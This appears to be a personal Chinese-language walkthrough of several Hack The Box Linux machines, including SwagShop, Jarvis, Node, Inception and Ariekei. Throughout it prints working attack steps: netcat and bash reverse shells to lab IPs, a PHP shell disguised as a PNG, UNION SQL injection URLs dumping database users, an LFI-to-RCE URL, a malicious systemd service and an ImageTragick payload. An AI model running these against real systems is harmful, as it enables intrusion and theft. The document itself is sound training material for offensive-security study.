---
title: HTB-tracks Linux Privilege Escalation 101
tags: [HTB, medium, easy, insane, hard, linux]

---

# Linux Privilege Escalation 101

![image](https://hackmd.io/_uploads/BJkcAl_lA.png)

## SwagShop
![image](https://hackmd.io/_uploads/ryUiRlOxR.png)

### 掃port
![image](https://hackmd.io/_uploads/Hkk2J-Ox0.png)

把它加進host裡
![image](https://hackmd.io/_uploads/B1pXeZug0.png)

先查一下apache版本，有個CVE-2021-41773
https://teamt5.org/tw/posts/apache-http-server-vulnerabilty-on-windows-2021/

但我試著打，他會濾掉，看起來是有防著(或是我打錯了啥?)
![image](https://hackmd.io/_uploads/Bkhg7Z_xA.png)

所以我掃目錄
![image](https://hackmd.io/_uploads/HklrrZOl0.png)


### find a root
我找到一組帳號而已
```
<username>root</username>
<password>fMVWh7bDHpgZkyfqQXreTjU9</password>
```
![image](https://hackmd.io/_uploads/Hyx4w-_e0.png)

所以我決定去找看看網站架構的版本
我發現了一個RCE漏洞
他做的就是新增一個帳號進去admin裡面
https://www.exploit-db.com/exploits/37977 <-(複製裡面的內容)

target要加index.php (帳密就是後面那兩個)
![image](https://hackmd.io/_uploads/SJHU3b_l0.png)

### get in web admin
拿得到的內容登入
![image](https://hackmd.io/_uploads/HkH3nbOlA.png)


### Froghopper

這裡要打進去需要用到一個技巧
叫做froghopper (因為攻擊者喜歡用pepe蛙的照片攻擊進去)
https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper
他特別的地方是你要去設定那裏開選項
其他就只是把php reverse shell丟進png裡面上傳上去
讓他執行而已
which means it's a RCE

> System -> Configuration (上方bar)
> Advanced –> Developer (左邊選單)
> Template Settings –> Allow Symlinks
> 修改為Yes，並且保存

圖1：
![螢幕擷取畫面 2024-04-25 111330](https://hackmd.io/_uploads/HyKO5BDbC.png)

圖2：
![螢幕擷取畫面 2024-04-25 111430](https://hackmd.io/_uploads/rJthcHDZR.png)

圖3：
![image](https://hackmd.io/_uploads/Hkd1jSDZ0.png)

![image](https://hackmd.io/_uploads/BJ5loSPW0.png)


### make an php reverse png

```
echo '<?php' >> shell.php.png
echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1234 >/tmp/f");' >> shell.php.png
echo '?>' >> shell.php.png
```

![image](https://hackmd.io/_uploads/BJykTHwbR.png)


### 上傳的地方

> Catalog –> Manage Categories (上方bar)
> name -> test
> Is Actice -> Yes
> save Category

圖1：
![image](https://hackmd.io/_uploads/rJm76rDWC.png)

然後要記得儲存
![image](https://hackmd.io/_uploads/SJJUprD-C.png)

### 執行exploit

先在機器監聽
![image](https://hackmd.io/_uploads/rkUsTHwZC.png)

然後要去這裡
> Newsletter –> Newsletter Templates -> Add New Template
> {{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}  <- 這串在前面的參考資料有說
> Preview Template

圖1：
![image](https://hackmd.io/_uploads/BygkCrw-A.png)

圖2：
![image](https://hackmd.io/_uploads/S1zHCSDZR.png)

看起來前面亂填就好了(?
![image](https://hackmd.io/_uploads/SyECRBPbR.png)

記得儲存
![image](https://hackmd.io/_uploads/BkElyIPW0.png)

然後要按這個
![image](https://hackmd.io/_uploads/S1DmyLvWA.png)


### privilege escalation

![image](https://hackmd.io/_uploads/SJymeIDbR.png)

![image](https://hackmd.io/_uploads/rkWdeUw-0.png)

可以在html之下運行 vi 拿到root(他sudo 剛好可以用，不用密碼的那種)
![image](https://hackmd.io/_uploads/B1xYgUPbC.png)

直接把這串改成 `sudo vi /var/www/html/ -c '!sh'`
https://gtfobins.github.io/gtfobins/vi/#sudo

### root

![image](https://hackmd.io/_uploads/S1uLW8wW0.png)

root.txt
![image](https://hackmd.io/_uploads/SJNd-UPb0.png)

user.txt
![image](https://hackmd.io/_uploads/Bkm7z8wbC.png)

---

## Help

![image](https://hackmd.io/_uploads/H1EWEUwb0.png)

先放進hosts裡，以免他會跑不出來
![image](https://hackmd.io/_uploads/r1gxVLPZA.png)

掃port會發現他開了三個port

![image](https://hackmd.io/_uploads/SJ8H48vZA.png)


### port 3000

他說了given query 
![image](https://hackmd.io/_uploads/r1NcvWYWA.png)

我試著塞點東西
![image](https://hackmd.io/_uploads/B1moD-K-R.png)

我發現他好像是api之類的東西
所以我查了一下發現了api的語法
https://graphql.org/learn/schema/

![image](https://hackmd.io/_uploads/HyhiDWK-A.png)

我就去找他的document，用curl 去看他會跑甚麼結果

- -s 安靜模式
- -H type
- -d HTTP POST Data

![image](https://hackmd.io/_uploads/rkUFPZF-C.png)

`{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}`

### port 80

接著我去看port 80有什麼
掃了目錄後發現一個叫做
helpdeskz

![image](https://hackmd.io/_uploads/SkKQoz1z0.png)

看起來是可以拿剛剛那組帳號登進去
(密碼要解hash)

![image](https://hackmd.io/_uploads/HkSjofkzC.png)

5d3c93182bb20f07b994a7f617e99cff:godhelpmeplz

我沒找到啥東西
我只有找到版本

![image](https://hackmd.io/_uploads/ByhraGJzR.png)

所以我去searchsploit
發現一個lfi的漏洞

![image](https://hackmd.io/_uploads/rkHKTMkMC.png)

![image](https://hackmd.io/_uploads/SytfAG1M0.png)

這裡可以上傳東西的地方只有ticket

![image](https://hackmd.io/_uploads/ByBwCfyGA.png)

but

![image](https://hackmd.io/_uploads/ryAtAfJfC.png)


所以我先建了一個ticket
然後我做了一個txt的檔案
![image](https://hackmd.io/_uploads/HkzGlQkG0.png)

我發現他的漏洞看起來是用sqli
![image](https://hackmd.io/_uploads/r1DXgQJf0.png)

所以我用burpsuite 攔截後建立成檔案

![image](https://hackmd.io/_uploads/SJKkbXyfR.png)

所以我用sqlmap掃看看

![image](https://hackmd.io/_uploads/By1j-X1f0.png)

他是sql blind

![image](https://hackmd.io/_uploads/r1mbmmkfA.png)

跑超久==

![image](https://hackmd.io/_uploads/SkBIDm1zC.png)

所以我拿到帳號密碼(這個網頁登不進去，合理懷疑是裡面的帳密)

![image](https://hackmd.io/_uploads/S1GE_7yfC.png)

### user.txt

![image](https://hackmd.io/_uploads/BJpSOXkzR.png)

### root.txt

我整個翻了一下，最終我決定從kernal下手
我發現了https://www.exploit-db.com/exploits/44298

所以我傳上去
![image](https://hackmd.io/_uploads/Bydo2m1zR.png)

root

![image](https://hackmd.io/_uploads/rJ9A2QkG0.png)
![image](https://hackmd.io/_uploads/SyyeTQkG0.png)


c41100d4023c645d90588ab37fd61983
![image](https://hackmd.io/_uploads/SJBV6myGA.png)

---

## Nibbles

![image](https://hackmd.io/_uploads/rknYTmJfA.png)

他開了80/22

![image](https://hackmd.io/_uploads/H191AmyM0.png)


看了80發現啥都掃不到
所以我開burp suit

![image](https://hackmd.io/_uploads/B1y4kVyGC.png)

發現了上面那個再掃之後出現了很多東西

![image](https://hackmd.io/_uploads/rJx_lg4yz0.png)

我有找到東西
/nibbleblog/content/private/config.xml

![image](https://hackmd.io/_uploads/HyVZPNJMA.png)


我先去查他的版本

![image](https://hackmd.io/_uploads/SkKLZN1M0.png)

他有個漏洞

![image](https://hackmd.io/_uploads/SkZd-EkG0.png)

但因為他好像是用matasploit 所以我改用另一個

https://github.com/dix0nym/CVE-2015-6967/blob/main/README.md

痾他密碼好像是預設?
所以我乾脆就直接輸入了

![image](https://hackmd.io/_uploads/HJGS7NyzA.png)

我發現plugins 好像可以上傳東西

![image](https://hackmd.io/_uploads/rypsDN1f0.png)

所以我要上傳 php-reverse-shell

![image](https://hackmd.io/_uploads/r1E5_N1M0.png)

會在這裡找到他

![image](https://hackmd.io/_uploads/SJyAOEyf0.png)

### user.txt

![image](https://hackmd.io/_uploads/ryhwKVyGA.png)

f1c5514dde67d030c0796debd41b32b6

![image](https://hackmd.io/_uploads/r1TaKEJMC.png)

### root.txt

剛剛有看到一個zip
解壓縮之後會有一個monitor.sh
內容看起來是類似清暫存的
我覺得應該可以塞東西進去

而且sudo不用密碼

![image](https://hackmd.io/_uploads/SJh09V1GA.png)

所以我要用tee 把 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 塞進去

開監聽之後sudo 執行他(退出去才有權限)

![image](https://hackmd.io/_uploads/Byu42VJMR.png)

root

![image](https://hackmd.io/_uploads/BJx_hEkG0.png)

3f3642ec725c000421bf7530a47e0904

![image](https://hackmd.io/_uploads/rJHK3V1GR.png)

---

## Mirai

![image](https://hackmd.io/_uploads/HJan2N1f0.png)

他開了6個port(我重掃才知道)
80port只是個幌子

![image](https://hackmd.io/_uploads/rk3_ZqJfC.png)

掃到一堆東西，但是進去之後都長一樣
![image](https://hackmd.io/_uploads/H1MME5JGR.png)

唯一有找到的東西是 80 port 有個不知道密碼的樹梅派

![image](https://hackmd.io/_uploads/ryh7ks1zA.png)


找了一下，發現他的提示就是名字
Mirai 好像是個殭屍網路的名字

好像是要用pi(密碼是樹梅派raspberry)登看看後台

### user.txt

雖然不知道這題為啥長這樣
但...

![image](https://hackmd.io/_uploads/HJDCJj1GR.png)

ff837707441b257a20e32199d7c8838d

![image](https://hackmd.io/_uploads/BydGei1fR.png)

### root.txt

![image](https://hackmd.io/_uploads/B1DHxsJzA.png)

root

![image](https://hackmd.io/_uploads/H1hOljJz0.png)

?

![image](https://hackmd.io/_uploads/HyjqlikzA.png)

?

![image](https://hackmd.io/_uploads/ByFNbjJGA.png)

可以用 strings /dev/sdb 去列出命令紀錄

![image](https://hackmd.io/_uploads/rJQcZiJzA.png)

---

## Node

![image](https://hackmd.io/_uploads/BynTbjJM0.png)

他出了21/3000 port

![image](https://hackmd.io/_uploads/H1-DciJf0.png)

我在網頁中發現他的設定

![image](https://hackmd.io/_uploads/HkAz9PlMC.png)

所以我試著直接去admin看，雖然它會直接跑login，但是我知道了它是用express 這個 frame

![image](https://hackmd.io/_uploads/BJhY9DlG0.png)

順帶一提，它是用應該是api呼叫user的
所以我決定curl看看能不能拿到東西

可以拿到所有帳號(jq只是個整理的工具)

![image](https://hackmd.io/_uploads/rJiP2wgM0.png)

把密碼解開之後會發現，它是sha256，然後最後一組密碼解不開

myP14ceAdm1nAcc0uNT：manchester
tom：spongebob
mark：snowflake

![image](https://hackmd.io/_uploads/r1JgavlzR.png)

當我登入之後出現一個backup檔案

![image](https://hackmd.io/_uploads/Hk_FTvlGA.png)

終於載下來之後發現它是個ascii 文字檔
我就把它用base64轉譯之後
發現它是個zip檔

![image](https://hackmd.io/_uploads/rJ0L-dgfC.png)

解開之後這應該是網站的原始碼

![image](https://hackmd.io/_uploads/S1ETZ_xfC.png)

可是不能直接解開
![image](https://hackmd.io/_uploads/HJCGG_gGR.png)

所以我把它丟進zip2john裡面
發現裡面有一段hash

![image](https://hackmd.io/_uploads/ryxizulzC.png)

用john解出來之後發現密碼 magicword

![image](https://hackmd.io/_uploads/HyjTGOxGA.png)

解出來了

![image](https://hackmd.io/_uploads/SJbs7ulMR.png)

我在app.js裡面找到密碼
mark:5AYRft73VtFpc84k

![image](https://hackmd.io/_uploads/HkPAQuezR.png)

### user.txt

mark

![image](https://hackmd.io/_uploads/rJcIVOezC.png)

我發現只有tom可以開user.txt

![image](https://hackmd.io/_uploads/HkfCN_lzR.png)

sudo 不能用，所以要找其他方式進去
我發現它是用mongo 去連接資料庫的

![image](https://hackmd.io/_uploads/S1fcUugGR.png)

連進去之後，裡面好像是空的

![image](https://hackmd.io/_uploads/H19mDdxGR.png)
![image](https://hackmd.io/_uploads/SyfEDuxM0.png)
![image](https://hackmd.io/_uploads/SyxovuxMR.png)

但是我可以自己塞東西進去(但是過幾秒後它就消失了)

![image](https://hackmd.io/_uploads/rkpy_OxMA.png)

可以發現剛剛那個123確實有存在

![image](https://hackmd.io/_uploads/H1RLu_lzC.png)

所以我先監聽，然後把reverse shell 輸入進去

![image](https://hackmd.io/_uploads/HyCWYdlfR.png)

然後我就變成tom了

![image](https://hackmd.io/_uploads/BJv7YOgGC.png)

cf048571e1e256b5e82f527459fa8bef

![image](https://hackmd.io/_uploads/rJyUF_lz0.png)


### root.txt

從上面id 可以發現 我們有一大堆權限
sudo 可以用(-l不行)
它要密碼

![image](https://hackmd.io/_uploads/Hks6c_xzR.png)

接著是我們有admin的權限
它的數字大於1000 which mean 它是由管理員創建的身分

找了一下跟他有關的檔案
它的權限是 root admin

![image](https://hackmd.io/_uploads/ry_hidlf0.png)

它是個elf-32的檔案(看起來是要逆向)

![image](https://hackmd.io/_uploads/S18q2dgMC.png)

它要我們輸入魔法字

![image](https://hackmd.io/_uploads/S1xiSpdlfA.png)

我用ltrace 追蹤它
-q 是啥 quite ?

![image](https://hackmd.io/_uploads/HkfJ1FlGC.png)

可以發現他開了
/etc/myplace/keys

下面是抓到b 然後一直在跑東西
最後結束

![image](https://hackmd.io/_uploads/B1ulkKeGA.png)

所以我就去cat 那個檔案
發現裡面有四條，最後一條是空白

![image](https://hackmd.io/_uploads/ry-ZgFgf0.png)

我用裡面給的keys 輸入 ，他們都給一樣的東西(b 那格才抓得到key)
即使是空白也是
看起來它還需要一個路徑

![image](https://hackmd.io/_uploads/ByyjgtgMC.png)

所以我去tmp 建了一個123的檔案
它給了一串東西

![image](https://hackmd.io/_uploads/S1RPbKeMR.png)

我覺得應該可以加上 -q
它給得好像不一樣了
我猜它應該是base64

![image](https://hackmd.io/_uploads/SkZ0-FeMR.png)

確實是base64 但還要加上zip檔

![image](https://hackmd.io/_uploads/ByGdfYlzA.png)

但他要密碼，所以我拿前面的密碼解看看
它好像會跑出那個地方的檔案(?

![image](https://hackmd.io/_uploads/HktrmYlzA.png)

所以我打算用看看root
空的🤔

![image](https://hackmd.io/_uploads/rka4VKezC.png)

好像用不了

![image](https://hackmd.io/_uploads/r1mTNtxM0.png)

要用 7z 解(好麻煩)
解出來長這樣==

![image](https://hackmd.io/_uploads/r1N_HtxfA.png)

看起來是故意的，為了不讓我們用這種方式直接拿到flag

![image](https://hackmd.io/_uploads/rkJADtlMC.png)

它有很多檢查，讓我們不能跳脫

![image](https://hackmd.io/_uploads/BkacsYgfA.png)

這段是它用zip加密然後把它變成base64的過程

> strstr：傳回指向str1中第一次出現str2的指針
> 
> strchr：傳回指向 str1 中第一次出現的 char 的指針
> 
> strcmp：如果 str1 與 str2 相同，則傳回 0

![image](https://hackmd.io/_uploads/SyI8hFgG0.png)

ps. 我原本找到的方法接著要做buffer overflow 然後拿到flag
但我找到更輕鬆更好的方式 from ippsec

它前面是檢查了一些東西，但還是有方法可以跳脫
像是用 /r*.* t (沒有.跟空白)
或是 /r??t
![image](https://hackmd.io/_uploads/rJrTG9lG0.png)

這樣可以不用開 PYTHON 就可以傳送了

![image](https://hackmd.io/_uploads/BkVFV9xzC.png)
![image](https://hackmd.io/_uploads/SJcY4qlf0.png)

root

![image](https://hackmd.io/_uploads/Hk5O49eGR.png)

### RCE

我先塞2000個A 進去看會發生什麼事
![image](https://hackmd.io/_uploads/SkXUHjlfC.png)

塞滿之後沒有return 就被kill了

![image](https://hackmd.io/_uploads/HkBdSolfA.png)

我建了一個不太一樣的內容試試看

> msf-pattern_create -l 1000 -s ABCDEFGHIJKLMNOPQRSTUVWXYZ,abcdefghijklmnopqrstuvwxyz,0123456789

![image](https://hackmd.io/_uploads/Hy3lUsgf0.png)


![image](https://hackmd.io/_uploads/SkfFIsgzR.png)

// 停在這是因為不知道為啥我的gdb 不會抓到我輸入三個物件它要存取的地方

理論上就是找到位置 + 512 偏移位
用lib去找
system exit /bin/sh 位置

把他們合在一起讓backup -q '' /exploit 
就可以靠buffer overflow 變成 root

---

所以我要用另一種方法

再不行我也可以攻擊kernal

![image](https://hackmd.io/_uploads/S1BF0jlMR.png)

可以發現它的版本裡有一個漏洞
(看源碼應該也是buffer overflow)

![image](https://hackmd.io/_uploads/SJ_b12lGC.png)

用前面的方式上傳上來
然後執行(./pwn)

![image](https://hackmd.io/_uploads/By7yenlf0.png)

root

![image](https://hackmd.io/_uploads/r1tMlhgMR.png)

---

## Jarvis

![image](https://hackmd.io/_uploads/BkwJ-2lfA.png)

開了22/80/64999

![image](https://hackmd.io/_uploads/Hk-pw2lfA.png)

64999 what

![image](https://hackmd.io/_uploads/SJCEuhlMR.png)


掃的時候找到phpmyadmin

![image](https://hackmd.io/_uploads/rkbB7hezR.png)

我輸入admin:admin它出現這個

![image](https://hackmd.io/_uploads/rytF7ngM0.png)

/phpmyadmin/doc/html/index.html

![image](https://hackmd.io/_uploads/S1ylEhlfA.png)

我查phpmyadmin 4.8.0 找到它有一個漏洞
可以直接從sql drop 出它的內容

![image](https://hackmd.io/_uploads/SkljE3gGR.png)

感覺是這裡

![image](https://hackmd.io/_uploads/rkeLShlfA.png)

但我試了沒啥用

然後我回去原本的網站
發現這裡有個訂房的看起來也能試試

![image](https://hackmd.io/_uploads/H17dO2xz0.png)

加個'它會抓不到東西

![image](https://hackmd.io/_uploads/BJvhOhlzC.png)

我試到第7才跑出來
5 是圖片
2 是title
3 是價錢
4 是描述
其他沒跑出來

![image](https://hackmd.io/_uploads/Bkdmq3ez0.png)

```url=
http://10.10.10.143/room.php?cod=100%20union%20select%201,group_concat(schema_name),3,4,5,6,7%20from%20information_schema.schemata;%20--%20-
```

![image](https://hackmd.io/_uploads/HJKwjnxfR.png)

```url=
http://10.10.10.143/room.php?cod=100%20union%20select%201,group_concat(table_name),3,4,5,6,7%20from%20information_schema.tables%20where%20table_schema=%27hotel%27;%20--%20-
```

![image](https://hackmd.io/_uploads/r1Qr3neMA.png)

```url=
http://10.10.10.143/room.php?cod=100%20union%20select%201,group_concat(column_name),3,4,5,6,7%20from%20information_schema.columns%20where%20table_name=%27room%27;%20--%20-
```

![image](https://hackmd.io/_uploads/rkTpnnlGA.png)

```url=
http://10.10.10.143/room.php?cod=100%20union%20select%201,group_concat(table_name),3,4,5,6,7%20from%20information_schema.tables%20where%20table_schema=%27mysql%27;%20--%20-
```

> column_stats,columns_priv,db,event,func,general_log,gtid_slave_pos,help_category,help_keyword,help_relation,help_topic,host,index_stats,innodb_index_stats,innodb_table_stats,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,slow_log,table_stats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user`

```url=
http://10.10.10.143/room.php?cod=100%20union%20select%201,group_concat(column_name),3,4,5,6,7%20from%20information_schema.columns%20where%20table_name=%27user%27;%20--%20-
```

> Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time


```url=
http://10.10.10.143/room.php?cod=100%20union%20select%201,user,3,4,password,6,7%20from%20mysql.user;%20--%20-
```

DBadmin：2D2B7A5E4E637B8FBA1D17F40318F277D29964D0：	imissyou

我們拿到了剛剛進不去的那裏的帳密了

![image](https://hackmd.io/_uploads/SJEoA2lMC.png)

而剛剛我還有找到(網路上)它有另一個漏洞CVE-2018-12613
是一個lfi的漏洞
https://blog.csdn.net/qq_34444097/article/details/85264686


裡面有個叫 pepper 的user

![image](https://hackmd.io/_uploads/Hy_ug6lG0.png)

![image](https://hackmd.io/_uploads/By2--pgGR.png)


試試看它會不會回傳

http://10.10.10.143/phpmyadmin/index.php?cmd=id&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_dnsvt1bgct034jrppkv99ag4btlu8qn6

phpMyAdmin:"dnsvt1bgct034jrppkv99ag4btlu8qn6"

![image](https://hackmd.io/_uploads/rJGu4alzC.png)

sess 後面接的是這個

![image](https://hackmd.io/_uploads/S1yjVpgz0.png)

把id 改成下面那串，然後要先開監聽
http://10.10.10.143/phpmyadmin/index.php?cmd=nc%20-e%20/bin/sh%2010.10.14.4%201111&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_0rhfbdu629c33vqc5s95pg9496s7o4fo
nc -e /bin/sh 10.10.14.4 1111

![image](https://hackmd.io/_uploads/By7FBTgGC.png)

### pepper

好像只能變成pepper (?)

![image](https://hackmd.io/_uploads/ryJJ86lMA.png)

這看起來是個可以ping ip 的程式

![image](https://hackmd.io/_uploads/rkHXLTxzR.png)

壞消息是它有過濾
好消息是它用os.system 執行程式

![image](https://hackmd.io/_uploads/r1SRI6xGC.png)

so it worked

![image](https://hackmd.io/_uploads/ByHuuagGC.png)

所以我在tmp 寫了一個reverse shell ，然後開監聽，用前面的方式執行它

bash -i >& /dev/tcp/10.10.14.4/1234 0>&1

![image](https://hackmd.io/_uploads/HySLFTgMR.png)

### user.txt

![image](https://hackmd.io/_uploads/SyJdYpeGA.png)

dd9fa4c63bc2eac7958f75ae28cb7723

![image](https://hackmd.io/_uploads/r1tcFTeMA.png)

### root.txt

我先從pepper 的身分組開始查
我發現它有一個 /bin/systemctl
通常 /bin 都只有root可以用
所以我覺得應該可以用

![image](https://hackmd.io/_uploads/r1_hvezzC.png)

https://gtfobins.github.io/gtfobins/systemctl/

![image](https://hackmd.io/_uploads/rkTDjlzM0.png)

查了一下原理跟用法

systemctl 會連接到 systemd 
通常它是root才可以寫入
所以只要我們寫一個檔案
然後link過去
就可以讓root執行
它只能執行 service 檔

```
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.4 5678'
KillMode=process  
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```

![image](https://hackmd.io/_uploads/rkpFhdGfC.png)

先link然後開監聽

![image](https://hackmd.io/_uploads/S1OD6OMz0.png)

開啟服務

![image](https://hackmd.io/_uploads/BJhqadfMC.png)

root

![image](https://hackmd.io/_uploads/SJ26T_fzA.png)

12812f41251eb022294ebe7d56a6ae9f

![image](https://hackmd.io/_uploads/SyyJAdGzA.png)

---

## Inception

![image](https://hackmd.io/_uploads/SkePAOGfR.png)

![image](https://hackmd.io/_uploads/B1TXVTXfA.png)

~~我發現了他程式寫錯~~

![image](https://hackmd.io/_uploads/Hk9tHI_G0.png)

在80port 我找到這串註解

![image](https://hackmd.io/_uploads/B1a0IU_MA.png)

而且有這個目錄

![image](https://hackmd.io/_uploads/SkCmDL_fA.png)

我發現了他的版本

![image](https://hackmd.io/_uploads/rytOvLOMA.png)

以及作者名字和email
![image](https://hackmd.io/_uploads/rk35vUdGC.png)

他也有個php頁面

![image](https://hackmd.io/_uploads/Hy3JKUuMC.png)

而我去google發現他有個(lfi還是要叫做afr)的漏洞
https://www.exploit-db.com/exploits/33004

他的用法是
`http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>`

輸入/etc/passwd 就會跑出一個pdf檔案，裡面是被base64加密的內容

![image](https://hackmd.io/_uploads/S1uycLdG0.png)

有一個用戶名叫做cobb

![image](https://hackmd.io/_uploads/HkdBc8OM0.png)

我去參考別人的辦法，他們是去找阿帕契的設定檔，雖然我不知道他們怎麼枚舉的
因為其實他很多東西出不來，你要試其實還蠻難的
/etc/apache2/sites-enabled/000-default.conf

![image](https://hackmd.io/_uploads/rk1_3LOMA.png)

把設定檔解密之後，可以發現authuserfile 有寫出一個密碼檔

![image](https://hackmd.io/_uploads/rJgbTIdz0.png)

`webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0`

![image](https://hackmd.io/_uploads/B1tSTIdM0.png)

我把他丟去hashcat解
`$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69`

webdav_tester:babygurl69

![image](https://hackmd.io/_uploads/By7ZCIOfC.png)

Then , I'M gonna use WebDav (好像只能這樣去找到能攻擊的地方)

webdav是個古老的枚舉工具 ， 由於http協定 被擴展，所以不只是只有get 、 post 等等的，還有lock，總之這個工具可以檢測網頁目錄在哪個協定下會成功，哪個會失敗

https://en.wikipedia.org/wiki/WebDAV


沒成功
![image](https://hackmd.io/_uploads/HJLNMDufR.png)

所以我用這個目錄(我不是很確定這是什麼，感覺像是測試目錄，但為甚麼會有我也不知道)
他跟我說unauthorized

![image](https://hackmd.io/_uploads/H1-UfPdGR.png)

加上帳密他就成功了，而且跑出很多put

![image](https://hackmd.io/_uploads/ryBM7DOz0.png)

### reverse shell

所以我了一個php reverse 的網頁在這

![image](https://hackmd.io/_uploads/BkQ-EPdzR.png)
![image](https://hackmd.io/_uploads/SyfVNP_zC.png)

他不理我

![image](https://hackmd.io/_uploads/HkhKrw_fR.png)

### forward-shell

https://www.youtube.com/watch?v=-ST2FSbqEcU

我統整懶人包版：

首先要先
mkfifo (一個檔案a)
touch (一個檔案b)

a 檔案可以用 | sh 來執行cmd
b 檔案可以儲存 a 檔案執行出來的結果

最重要的是 a 檔案如果執行 tail -f 那執行就可以源源不斷

可以用手編簡易版或是python版等等

https://0xdf.gitlab.io/files/inception-forwardshell.py
https://github.com/IppSec/forward-shell.git

![image](https://hackmd.io/_uploads/S1uZ6wOfC.png)

### cobb

在搜查時我發現了wordpress  
還有bash不能用

![image](https://hackmd.io/_uploads/SJLq6wdM0.png)

我在裡面的wp-config找到
root：VwPddNh7xMZyDQoByQL4

![image](https://hackmd.io/_uploads/Hkl00wdf0.png)

但我們八成也是用不了mysql的
所以我猜應該是要用proxychain 去連到ssh裡

before that i used to add it to list
it called /etc/proxychains4.conf

![image](https://hackmd.io/_uploads/SJSGzOdf0.png)

cobb

![image](https://hackmd.io/_uploads/BJJtGO_GA.png)

### user.txt

c826282e8819508f546c79dafe022a26
![image](https://hackmd.io/_uploads/HJ3cGd_GC.png)


### root.txt

我沒想到難度突然直線下降
![image](https://hackmd.io/_uploads/rJ9pMOuGR.png)

![image](https://hackmd.io/_uploads/SkoZQuuzR.png)

我被騙了

![image](https://hackmd.io/_uploads/SkyXQdOGA.png)

我先查他有沒有放一樣檔名的檔案在其他地方

![image](https://hackmd.io/_uploads/HkywB_uGR.png)

再看他後台有沒有聯去其他地方

![image](https://hackmd.io/_uploads/B1_SrddMC.png)

最後是檢查他的tcp跟udp 發現剛沒有掃到ftp

![image](https://hackmd.io/_uploads/BkoPS_dMC.png)

是預設

![image](https://hackmd.io/_uploads/ByLl8udGR.png)

so 我先去把他的crontab get下來
他會用apt 更新跟升級

![image](https://hackmd.io/_uploads/rkbQPu_GR.png)

以防萬一我先try，果然不行

![image](https://hackmd.io/_uploads/BJBiDOuzA.png)

我們剛剛有再udp掃到一個tftp 
我可以用他來put檔案

so 它是用apt去跑，所以我們也可以用這個資料給的內容去讓他跑command
https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/

這是我的shell
![image](https://hackmd.io/_uploads/SJZYd6ufR.png)

開nc
![image](https://hackmd.io/_uploads/SJ3KOadG0.png)

上傳後等他5分鐘
![image](https://hackmd.io/_uploads/HJ2psOOfC.png)
![image](https://hackmd.io/_uploads/ryr6uauGA.png)

![image](https://hackmd.io/_uploads/HJIOgyFG0.png)

f5870707e5ce4c87b634a6ca13256b33

![image](https://hackmd.io/_uploads/HkYYx1Kf0.png)

這題就是我們進到 192.168.1.10 但真正的flag在 192.168.0.1裡面
(雖然最後是用ssh連上去的)

---

## Ariekei

![image](https://hackmd.io/_uploads/rJ3KWkFGR.png)

有4個port有詳細內容，其他基本上可以算是unknown

![image](https://hackmd.io/_uploads/SkASXZKMR.png)

掃了目錄之後感覺怪怪的，因為一開始網頁是顯示維護中的
看了一下內容，有一些網頁排版工具的版本

![image](https://hackmd.io/_uploads/H1ZKPiFfR.png)
![image](https://hackmd.io/_uploads/SJovuzFz0.png)

接著我發現/cgi-bin/ 裡面有內容

![image](https://hackmd.io/_uploads/S1v_uMKzC.png)

所以我就去看看他有些甚麼東西
可以看到
這裡有個用戶名 /home/spanishdancer/content/index.html
bash 的版本 GNU bash, version 4.2.37

發現這個版本的bash有一個RCE漏洞叫做Shellshock

https://blog.haostudio.net/hwp/building-bash-from-source-%E8%A3%9C-shellshock-%E6%BC%8F%E6%B4%9E/
https://zh.wikipedia.org/zh-tw/Shellshock

![image](https://hackmd.io/_uploads/HymY5ftfA.png)
![image](https://hackmd.io/_uploads/B1Vk5GKM0.png)

我試著用burpsuite 時發現，他連到其他地方去的樣子
而且有waf
X-Ariekei-WAF: beehive.ariekei.htb
https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/


![image](https://hackmd.io/_uploads/B1oSFotf0.png)

I tried it but ...
It seems like a smile

![image](https://hackmd.io/_uploads/S107sotfR.png)

### calvin

As i said ，我們掃port的時候DNS有告訴我們有兩個不同的子網路

![image](https://hackmd.io/_uploads/B1NdssKz0.png)

把他們加到 hosts裡之後，掃他找到upload

![image](https://hackmd.io/_uploads/BkUWRstfA.png)

他長這樣
標題寫Image Converter

![image](https://hackmd.io/_uploads/rkd60sYzA.png)

這讓我想到之前打ctf的時候有遇過一題，他是在白箱裡面塞一個叫做imagemagic的函式
所以我就去找了一下
發現它叫做ImageTragick
CVE-2016–3714

https://book.jorianwoltjer.com/web/imagemagick
https://imagetragick.com/

用法be like

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i >/dev/tcp/10.10.14.4/1111 0<&1 2>&1")''")'
pop graphic-context
```

![image](https://hackmd.io/_uploads/BJd2I2tzC.png)

接著就是開監聽然後上傳

![image](https://hackmd.io/_uploads/SJMMvhtGC.png)

### bastion

進去之後我發現這個好像是用anaconda建置的docker
